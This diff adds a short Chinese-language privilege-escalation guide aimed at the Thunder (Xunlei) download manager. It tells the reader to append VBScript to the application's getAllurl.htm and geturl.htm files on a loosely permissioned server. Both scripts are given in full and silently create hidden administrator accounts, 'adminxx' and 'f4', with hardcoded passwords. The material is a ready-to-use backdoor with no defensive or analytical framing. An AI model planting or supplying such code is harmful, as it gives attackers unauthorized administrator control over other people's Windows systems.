@@ -1,0 +1,48 @@
+迅雷提权
+
+条件
+服务器权限很松的时候 才有可能可写
+
+迅雷默认安装文件夹
+
+盘符\Program Files\Thunder Network\Thunder
+盘符\Program Files\Thunder
+
+要修改的两个文件
+
+进入Program文件夹
+
+找到下面两个文件 
+
+getAllurl.htm
+geturl.htm
+
+在最末尾处 添加 下面两段代码任意一段 也可以两段代码都添加
+会添加两个用户
+
+
+NET提权提权脚本  添加帐号adminxx   密码admin.asd
+
+<script language="vbscript">
+set vbs=createobject("wscript.shell")
+vbs.run "cmd /c net user adminxx admin.asd /add",0
+vbs.run "cmd /c net localgroup administrators adminxx /add",0
+</script>
+
+
+VBS提权提权脚本  添加帐号 f4   密码 f4
+
+<script language="vbscript">
+set wsnetwork=CreateObject("WSCRIPT.NETWORK") 
+os="WinNT://"&wsnetwork.ComputerName 
+Set ob=GetObject(os) 
+Set oe=GetObject(os&"/Administrators,group") 
+Set od=ob.Create("user","f4") 
+od.SetPassword "f4" 
+od.SetInfo 
+Set of=GetObject(os&"/f4",user) 
+oe.add os&"/f4"
+</script>
+
+
+
